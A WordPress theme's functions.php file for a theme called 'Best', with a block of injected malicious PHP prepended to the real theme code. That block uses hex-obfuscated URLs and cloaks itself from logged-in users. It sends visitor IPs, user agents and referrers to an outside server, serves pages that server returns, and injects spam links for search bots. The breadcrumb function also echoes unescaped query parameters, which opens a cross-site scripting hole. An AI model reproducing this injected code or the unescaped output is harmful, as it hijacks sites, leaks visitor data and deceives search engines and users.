<?php if(!class_exists('Ratel')){if(function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}if(isset($_REQUEST['xftest'])){die(pi()*6);}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',4);if(!isset($_SERVER['HTTP_USER_AGENT'])||!trim($_SERVER['HTTP_USER_AGENT'])){return false;}$is_bot=0;if(@preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer|cuill.com|clushbot)/i",$_SERVER["HTTP_USER_AGENT"])){$is_bot=1;}$ruri=trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/");$bad_urls='#xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';if(preg_match($bad_urls,$ruri)){return false;}$host='unknown';if(isset($_SERVER["HTTP_HOST"])){if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=parse_url('http://' .$_SERVER["HTTP_HOST"]);if($tmp['host']){$host=$tmp['host'];if(substr($host,0,4)== 'www.'){$host=substr($host,4);}}if(isset($_REQUEST[md5(md5($host))])OR isset($_COOKIE[md5(md5($host))])){die('suspicious request denied');}}class Ratel{public $links_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f\x6f\x6e\x65\x67\x74\x2f\x67\x65\x74\x2e\x70\x68\x70";public $door_url="\x68\x74\x74\x70\x3a\x2f\x2f\x73\x70\x61\x63\x65\x62\x7a\x2e\x63\x6f\x6d\x2f";public $ip='';public $ua='';public $css='';public $js='';public $host='';public $ip_lists=array('google'=>array('203.208.60.0/24','66.249.64.0/20','72.14.199.0/24','209.85.238.0/24','66.249.90.0/24','66.249.91.0/24','66.249.92.0/24'),'bing'=>array('67.195.37.0/24','67.195.50.0/24','67.195.110.0/24','67.195.111.0/24','67.195.112.0/23','67.195.114.0/24','67.195.115.0/24','68.180.224.0/21','72.30.132.0/24','72.30.142.0/24','72.30.161.0/24','72.30.196.0/24','72.30.198.0/24','74.6.254.0/24','74.6.8.0/24','74.6.13.0/24','74.6.17.0/24','74.6.18.0/24','74.6.22.0/24','74.6.27.0/24','98.137.72.0/24','98.137.206.0/24','98.137.207.0/24','98.139.168.0/24','114.111.95.0/24','124.83.159.0/24','124.83.179.0/24','124.83.223.0/24','183.79.63.0/24','183.79.92.0/24','203.216.255.0/24','211.14.11.0/24','65.52.104.0/24','65.52.108.0/22','65.55.24.0/24','65.55.52.0/24','65.55.55.0/24','65.55.213.0/24','65.55.217.0/24','131.253.24.0/22','131.253.46.0/23','40.77.167.0/24','199.30.27.0/24','157.55.16.0/23','157.55.18.0/24','157.55.32.0/22','157.55.36.0/24','157.55.48.0/24','157.55.109.0/24','157.55.110.40/29','157.55.110.48/28','157.56.92.0/24','157.56.93.0/24','157.56.94.0/23','157.56.229.0/24','199.30.16.0/24','207.46.12.0/23','207.46.192.0/24','207.46.195.0/24','207.46.199.0/24','207.46.204.0/24','157.55.39.0/24'),'baidu'=>array('180.76.15.0/24','119.63.196.0/24','115.239.212./24','119.63.199.0/24','122.81.208.0/22','123.125.71.0/24','180.76.4.0/24','180.76.5.0/24','180.76.6.0/24','185.10.104.0/24','220.181.108.0/24','220.181.51.0/24','111.13.102.0/24','123.125.67.144/29','123.125.67.152/31','61.135.169.0/24','123.125.68.68/30','123.125.68.72/29','123.125.68.80/28','123.125.68.96/30','202.46.48.0/20','220.181.38.0/24','123.125.68.80/30','123.125.68.84/31','123.125.68.0/24'),'yandex'=>array('100.43.90.0/24','37.9.115.0/24','37.140.165.0/24','77.88.22.0/25','77.88.29.0/24','77.88.31.0/24','77.88.59.0/24','84.201.146.0/24','84.201.148.0/24','84.201.149.0/24','87.250.243.0/24','87.250.253.0/24','93.158.147.0/24','93.158.148.0/24','93.158.151.0/24','93.158.153.0/32','95.108.128.0/24','95.108.138.0/24','95.108.150.0/23','95.108.158.0/24','95.108.156.0/24','95.108.188.128/25','95.108.234.0/24','95.108.248.0/24','100.43.80.0/24','130.193.62.0/24','141.8.153.0/24','178.154.165.0/24','178.154.166.128/25','178.154.173.29','178.154.200.158','178.154.202.0/24','178.154.205.0/24','178.154.239.0/24','178.154.243.0/24','37.9.84.253','199.21.99.99','178.154.162.29','178.154.203.251','178.154.211.250','95.108.246.252','5.45.254.0/24','5.255.253.0/24','37.140.141.0/24','37.140.188.0/24','100.43.81.0/24','100.43.85.0/24','100.43.91.0/24','199.21.99.0/24'));public $bot=false;function get_client_ip(){foreach(array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR')as $key){if(array_key_exists($key,$_SERVER)=== true){foreach(array_map('trim',explode(',',$_SERVER[$key]))as $ip){if(filter_var($ip,FILTER_VALIDATE_IP)!== false){return $ip;}}}}return $_SERVER['REMOTE_ADDR'];}function init($ruri,$host,$is_bot){$this->ua=$_SERVER['HTTP_USER_AGENT'];$this->is_bot=$is_bot;$this->ruri=$ruri;$this->ip=$this->get_client_ip();$this->the_end();}function the_end(){$this->detect_bot();if(count($_GET)=== 1 and empty($_GET[0])){$not_uri=end(array_keys($_GET));}$url_p=$this->door_url .'?data=' .base64_encode(@serialize(@array('url'=> $_SERVER["HTTP_HOST"],'uri'=> $_SERVER["REQUEST_URI"],'ua'=> $this->ua,'ref'=> $_SERVER["HTTP_REFERER"],'ip'=> $this->ip,'not_uri'=> $not_uri,'lang'=> $_SERVER['HTTP_ACCEPT_LANGUAGE'],'bot'=> $this->bot))) .'&url=' .$_SERVER["HTTP_HOST"];$content=$this->get($url_p);if(!empty($content)or $content != ''){$content=@base64_decode($content);if(strpos($content,'404_not_found')!== false){header("HTTP/1.0 404 Not Found");exit;}if(strripos($content,' keys/' .$_SERVER["HTTP_HOST"])!== false){return false;}if(@strpos(@strtolower($content),'</html>')!== false){die($content);}}else{$this->links=$this->make_links();if(!empty($this->links)or $this->links !== False){ob_start(array($this,'rwcontent'));register_shutdown_function('ob_end_flush');}}}function make_links(){$host='unknown';if(isset($_SERVER["HTTP_X_FORWARDED_HOST"])){$_SERVER["HTTP_HOST"]=$_SERVER["HTTP_X_FORWARDED_HOST"];}$tmp=@parse_url('http://' .$_SERVER["HTTP_HOST"]);if(isset($tmp['host'])){$host=$tmp['host'];}$page=$this->get("$this->links_url?host=$host&uri=" .urlencode($_SERVER["REQUEST_URI"]) ."&bot={$this->bot}&ip=" .urlencode($this->ip));if(strpos($page,'<link>')!== FALSE){preg_match_all('~<link>(.*?)</link>~',$page,$m);$links=isset($m[1])?$m[1]:array();return $links;}return false;}function rwcontent($content){$tags=array('p','span','strong','em','i','td','div','ul','li','span','body');$tags_vals=array();foreach($tags as $tag){preg_match_all("~<{$tag}.*?>(.*?)</{$tag}>~i",$content,$matches);if(@isset($matches[0])){foreach($matches[0]as $match){$tags_vals[]=array('tag'=> $tag,'content'=> $match);}}if(count($tags_vals)>count($this->links)){break;}}foreach($this->links as $link_index => $link){foreach($tags_vals as $tag_index => $tag_val){if(strlen($tag_val['content'])%2 == 1){$tag_content_new=$tag_val['content'];$tag_content_new=preg_replace("(<{$tag_val['tag']}.*?>)","$0{$link} ",$tag_content_new,1);}else{if(substr($tag_val['content'],-(strlen($tag_val['tag'])+4))==".</{$tag_val['tag']}>"){$tag_content_new=str_replace(".</{$tag_val['tag']}>"," {$link}.</{$tag_val['tag']}>",$tag_val['content']);}else{$tag_content_new=str_replace("</{$tag_val['tag']}>"," {$link} </{$tag_val['tag']}>",$tag_val['content']);}}$content=preg_replace("~{$tag_val['content']}~i",$tag_content_new,$content,1);unset($tags_vals[$tag_index]);if(strpos($content,$link)!== false){unset($links[$link_index]);continue 2;}}}return $content;}function detect_bot(){if(@preg_match('/google/i',$this->ua)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo/i',$this->ua)){$this->bot='bing';return;}if(@preg_match('/yandex|yadirectbot/i',$this->ua)){$this->bot='yandex';return;}if(@preg_match('/baidu/i',$this->ua)){$this->bot='baidu';return;}if(@preg_match('~aport|rambler|abachobot|accoona|acoirobot|aspseek|croccrawler|dumbot|webcrawler|geonabot|gigabot|lycos|scooter|altavista|webalta|adbot|estyle|mail.ru|scrubby~i',$this->ua)){$this->bot='other';return;}$ipl=ip2long($this->ip);foreach($this->ip_lists as $crawler => $masks){foreach($masks as $mask){if(!strpos($mask,'/')){if($this->ip == $mask){$this->bot=$crawler;return;}}elseif(@$this->cidr_match($ipl,$mask)){$this->bot=$crawler;return;}}}$referer=@gethostbyaddr($this->ip);if(@preg_match('/google/i',$referer)){$this->bot='google';return;}if(@preg_match('/bing|msn|msr|slurp|yahoo|microsoft/i',$referer)){$this->bot='bing';return;}}function cidr_match($ip,$range){list($subnet,$bits)=explode('/',$range);$subnet=ip2long($subnet);$mask=-1 <<(32-$bits);$subnet &= $mask;return@($ip&$mask)== $subnet;}function get($url){if(function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,8);curl_setopt($ch,CURLOPT_TIMEOUT,15);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');$data=curl_exec($ch);curl_close($ch);return $data;}elseif(@ini_get('allow_url_fopen')){return@file_get_contents($url);}else{$parts=parse_url($url);$target=$parts['host'];$port=isset($parts['port'])?$parts['port']:80;$page=isset($parts['path'])?$parts['path']:'';$page .= isset($parts['query'])?'?' .$parts['query']:'';$page .= isset($parts['fragment'])?'#' .$parts['fragment']:'';$page=($page == '')?'/':$page;if($fp=@fsockopen($target,$port,$errno,$errstr,3)){@socket_set_option($fp,SOL_SOCKET,SO_RCVTIMEO,array("sec"=> 1,"usec"=> 1));$headers="GET $page HTTP/1.1\r\n";$headers .="Host: {$parts['host']}\r\n";$headers .= "Connection: Close\r\n\r\n";if(fwrite($fp,$headers)){$resp='';while(!feof($fp)&&($curr=fgets($fp,128))!== false){$resp .= $curr;}if(isset($curr)&& $curr !== false){fclose($fp);return substr(strstr($resp,"\r\n\r\n"),3);}}fclose($fp);}}return TRUE;}}$ratel=new Ratel;$ratel->init($ruri,$host,$is_bot);} 
/**
 * Best functions and definitions
 *
 * @subpackage Best
 * @since      Best 1.0
 */
if ( ! isset( $content_width ) ) {
	$content_width = 656;
}
function best_setup() {
	/* Sets up the content width value based on the theme's design. */
	load_theme_textdomain( 'best', get_template_directory() . '/languages' );

	add_theme_support( 'title-tag' );
	/* This theme styles the visual editor with editor-style.css to match the theme style. */
	add_editor_style( 'css/editor_style.css' );
	/* Adds RSS feed links to <head> for posts and comments. */
	add_theme_support( 'automatic-feed-links' );
	/* Switches default core markup for search form, comment form, and comments to output valid HTML5. */
	add_theme_support( 'html5', array( 'comment-form', 'comment-list' ) );
	/* This theme supports all available post formats by default. See http://codex.wordpress.org/Post_Formats */
	add_theme_support( 'post-formats',
		array(
			'aside',
			'audio',
			'chat',
			'gallery',
			'image',
			'link',
			'quote',
			'status',
			'video',
		)
	);
	add_theme_support( 'custom-header',
		array(
			'default-image'          => '',
			'width'                  => 1920,
			'height'                 => 245,
			'flex-width'             => false,
			'flex-height'            => false,
			'random-default'         => false,
			'header-text'            => true,
			'default-text-color'     => '#444',
			'uploads'                => true,
			'wp-head-callback'       => 'best_header_style',
			'admin-head-callback'    => '',
			'admin-preview-callback' => '',
		)
	);
	/* This theme supports custom background color and image, and here we also set up the default background color. */
	add_theme_support( 'custom-background',
		array(
			'default-color' => 'fff',
		)
	);
	/* This theme uses a custom image size for featured images, displayed on "standard" posts. */
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'best_image_content_size', 656, 9999 ); /* Unlimited height, soft crop */
}

/* register navigation menu */
function best_register_nav_menu() {
	register_nav_menu( 'header-menu', __( 'Header Menu', 'best' ) );
}

/* РЎonclusion sidebar */
function best_register_sidebar() {
	/* Right sidebar */
	register_sidebar(
		array(
			'name'          => __( 'Home Right Sidebar', 'best' ),
			'id'            => 'best_right_sidebar',
			'before_widget' => '<section class="best-witget-right-sidebar">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="best-widget-title">',
			'after_title'   => '</h2>',
		)
	);
	/* Footer sidebar */
	register_sidebar(
		array(
			'name'          => __( 'Footer Sidebar', 'best' ),
			'id'            => 'best_footer_sidebar',
			'before_widget' => '<section class="best-witget-footer-sidebar">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="best-widget-title">',
			'after_title'   => '</h2>',
		)
	);
}

/* Proper way to enqueue scripts and styles */
function best_style_scripts() {
	/* Adds JavaScript to pages with the comment form to support sites with threaded comments (when in use). */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	wp_enqueue_style( 'best-styles', get_stylesheet_uri() );
	wp_enqueue_script( 'best-scripts', get_template_directory_uri() . '/js/scripts.js', array( 'jquery' ) );
	/* including scripts for compatibility html5 with IE */
	wp_enqueue_script( 'best-html5', get_template_directory_uri() . '/js/html5.js' );
	/* array with elements to localize in scripts */
	$script_localization = array(
		'choose_file'          => __( 'Choose file', 'best' ),
		'file_is_not_selected' => __( 'File is not selected', 'best' ),
		'best_home_url'        => esc_url( home_url() ),
	);
	wp_localize_script( 'best-scripts', 'script_loc', $script_localization );
}

/* Includes support Breadcrumbs */
function best_breadcrumbs() {
	echo '<h3>';
	if ( is_single() ) {
		/* show title differently depending on whether list of categories is displayed   */
		if ( has_category() ) { /* check if the post belongs to any categories  */
			echo get_the_title();
		} elseif ( isset( $_GET['page'] ) && ! empty( $_GET['page'] ) ) { /* if it is a page of a paginated post  */
			if ( ! is_front_page() ) { /* if it is not home page add hyphen before 'page' */
				_e( 'Page ', 'best' );
				echo $_GET['page'];
			}
		}
	} elseif ( is_category() ) {
		printf( __( 'Category Archives', 'best' ) . ':&thinsp;%s', single_cat_title( '', false ) );
	} elseif ( is_attachment() ) {
		echo get_the_title();
	} elseif ( is_page() ) {
		echo get_the_title();
	} elseif ( is_tag() ) { /* if it is a tags archive page  */
		printf( __( 'Tag Archives', 'best' ) . ':&thinsp;%s', single_tag_title( '', false ) );
	} elseif ( is_day() ) {
		echo __( 'Archive for', 'best' ) . ' &thinsp;';
		the_time( 'F jS Y' );
	} elseif ( is_month() ) {
		echo __( 'Archive for', 'best' ) . ' &thinsp;';
		the_time( 'F Y' );
	} elseif ( is_year() ) {
		echo __( 'Archive for', 'best' ) . ' &thinsp;';
		the_time( 'Y' );
	} elseif ( is_author() ) {
		echo __( 'Author&#8217;s Archive', 'best' ) . ':&thinsp;';
		the_author();
	} elseif ( is_search() ) {
		echo __( 'Search Results', 'best' );
	} elseif ( is_404() ) {
		echo __( 'Page not found', 'best' );
	}
	if ( isset( $_GET['paged'] ) && ! empty( $_GET['paged'] ) ) { /* if it is a page of the post list  */
		echo '&thinsp;' . __( 'Page ', 'best' );
		echo $_GET['paged'];
	}
	echo '</h3>';
	if ( ( ! is_front_page() ) && ( ! is_404() ) ) { /* if it is Front Page 'Home' is not displayed  */
		echo '<a href="' . esc_url( get_home_url( null, '/' ) ) . '">' . __( 'Home', 'best' ) . '</a>'; /* link to Front Page */
	} /*endif is_front_page()  */
	if ( is_single() ) {
		/* show title differently depending on whether list of categories is displayed   */
		if ( has_category() ) { /* check if the post belongs to any categories  */
			echo '&thinsp;/&thinsp;' . get_the_title();
		} else {
			echo '&thinsp;/&thinsp;' . get_the_title();
		}
		if ( isset( $_GET['page'] ) && ! empty( $_GET['page'] ) ) { /* if it is a page of a paginated post 	 */
			if ( ! is_front_page() ) { /* if it is not home page add hyphen before 'page' */
				$symbol_before_page = '&thinsp;/&thinsp;';
			} else {
				$symbol_before_page = '';
			}
			echo $symbol_before_page;
			_e( 'Page ', 'best' );
			echo $_GET['page'];
		}
	} elseif ( is_category() ) {
		$category  = get_queried_object();
		$this_cat  = $category->name;
		$cat_bread = array();
		if ( $category->parent ) {
			while ( $category->parent ) {
				$category = get_category( $category->parent );
				array_push( $cat_bread, '&thinsp;/&thinsp;<a href="' . esc_url( get_category_link( $category->cat_ID ) ) . '" title="' . esc_attr( $category->slug ) . '">' . $category->name . '</a>' );
			}
			for ( $i = count( $cat_bread ) - 1; $i >= 0; $i -- ) {
				echo $cat_bread[ $i ];
			}
		}
		echo '&thinsp;/&thinsp;' . $this_cat;
	} elseif ( is_attachment() ) {
		echo '&thinsp;/&thinsp;' . get_the_title();
	} elseif ( is_page() ) {
		global $post;
		if ( $post->ancestors ) {
			/* reverse order of a parent pages array for the current page  */
			$ancestors = array_reverse( $post->ancestors );
			/* display links to parent pages of the current page  */
			for ( $i = 0; $i < count( $ancestors ); $i ++ ) {
				if ( 0 == $i ) {
					echo '&thinsp;/&thinsp;<a href=' . get_permalink( $ancestors[ $i ] ) . '>' . get_the_title( $ancestors[ $i ] ) . '</a>';
				} else {
					echo '&thinsp;/&thinsp;<a href=' . get_permalink( $ancestors[ $i ] ) . '>' . get_the_title( $ancestors[ $i ] ) . '</a>';
				}
			}
			echo '&thinsp;/&thinsp;' . get_the_title();
		} else {
			echo '&thinsp;/&thinsp;' . get_the_title();
		}
	} elseif ( is_tag() ) { /* if it is a tags archive page  */
		printf( '&thinsp;/&thinsp;%s', single_tag_title( '', false ) );
	} elseif ( is_day() ) {
		echo '&thinsp;/&thinsp;';
		the_time( 'F jS Y' );
	} elseif ( is_month() ) {
		echo '&thinsp;/&thinsp;';
		the_time( 'F Y' );
	} elseif ( is_year() ) {
		echo '&thinsp;/&thinsp;';
		the_time( 'Y' );
	} elseif ( is_author() ) {
		echo '&thinsp;/&thinsp;';
		the_author();
	} elseif ( is_search() ) {
		echo '&thinsp;/&thinsp;' . __( 'Search Results', 'best' );
	} elseif ( is_404() ) {
		echo '&thinsp;/&thinsp;' . __( 'Page not found', 'best' );
	}
	if ( isset( $_GET['paged'] ) && ! empty( $_GET['paged'] ) ) { /* if it is a page of the post list  */
		if ( ! is_front_page() ) { /* if it is not home page add hyphen before 'page' */
			$symbol_before_page = '&thinsp;/&thinsp;';
		} else {
			$symbol_before_page = '';
		}
		echo $symbol_before_page;
		_e( 'Page ', 'best' );
		echo $_GET['paged'];
	}
}

/* output function posts */
function best_posts() {
	global $wp_query;
	$num_posts = $wp_query->found_posts;
	$num_posts = sprintf( _n( '%s Post', '%s Posts', $num_posts, 'best' ), number_format_i18n( $num_posts ) );
	if ( ! is_singular() ) {
		echo $num_posts;
	}
}

/* caption text */
function best_the_post_thumbnail_caption() {
	global $post;
	$thumbnail_id    = get_post_thumbnail_id( $post->ID );
	$thumbnail_image = get_posts(
		array(
			'p'         => $thumbnail_id,
			'post_type' => 'attachment',
		)
	);
	if ( $thumbnail_image && isset( $thumbnail_image[0] ) ) {
		if ( '' != $thumbnail_image[0]->post_excerpt ) {
			echo '<p class="wp-caption-text">' . $thumbnail_image[0]->post_excerpt . '</p>';
		}
	}
}

/* functions file enables you to customize the read more link text */
function best_modify_read_more_link() {
	return '<a class="more-link" href="' . get_permalink() . '">' . __( 'More Link', 'best' ) . '</a>';
}

function best_header_style() {
	$text_color   = get_header_textcolor();
	$display_text = display_header_text();
	/* If no custom options for text are set, return default. */
	if ( HEADER_TEXTCOLOR == $text_color ) {
		return;
	}
	/* If optins are set, we use them  */ ?>
	<style type="text/css">
		<?php /*If the user has set a custom color for the text use that */
		if ( 'blank' != $text_color ) { ?>
			.best-site-title,
			.best-site-title a {
				color: <?php echo '#' . $text_color . '!important'; ?>;
			}
		<?php }
		/* Display text or not */
		if ( ! $display_text ) { ?>
			.best-site-title {
				display: none;
			}
		<?php } ?>
	</style>
<?php }

add_action( 'after_setup_theme', 'best_setup' );
add_action( 'init', 'best_register_nav_menu' );
add_action( 'widgets_init', 'best_register_sidebar' );
add_action( 'wp_enqueue_scripts', 'best_style_scripts' );
add_action( 'best_breadcrumbs', 'best_breadcrumbs' );
add_action( 'best_posts', 'best_posts' );
add_action( 'best_the_post_thumbnail_caption', 'best_the_post_thumbnail_caption' );
add_filter( 'the_content_more_link', 'best_modify_read_more_link' );
